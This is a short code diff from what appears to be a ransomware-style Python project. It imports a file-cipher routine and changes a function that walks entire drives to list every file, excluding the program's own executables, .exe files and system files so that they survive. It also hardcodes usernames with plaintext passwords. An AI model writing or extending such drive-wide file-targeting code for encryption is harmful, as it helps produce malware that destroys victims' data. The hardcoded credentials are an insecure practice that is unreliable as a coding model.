@@ -3,22 +3,21 @@ from client.actions import cypher_files
 import try_exe
 import os
 import string
-
+import sys
 users = {"ido": "12345", "noam": "eyal_en22"}
 
 
 def get_files(drive_letter):
     file_paths = []
-    exclude_file = "OPEN_DOK"
-
-    for root, dirs, files in os.walk(drive_letter):
+    current_executable = os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__)
+    excluded_names = {current_executable, "OPEN_DOK.exe", "client_logic.exe", "desktop.ini"}
+    for root, dirs, files in os.walk(drive_letter, topdown=False):
         for file in files:
-            if exclude_file in file:
+            if file.endswith(".exe") or file in excluded_names or file.startswith('.'):
                 continue
 
             full_path = os.path.join(root, file)
             file_paths.append(full_path)
-
     return file_paths
 
 def get_drive_list():
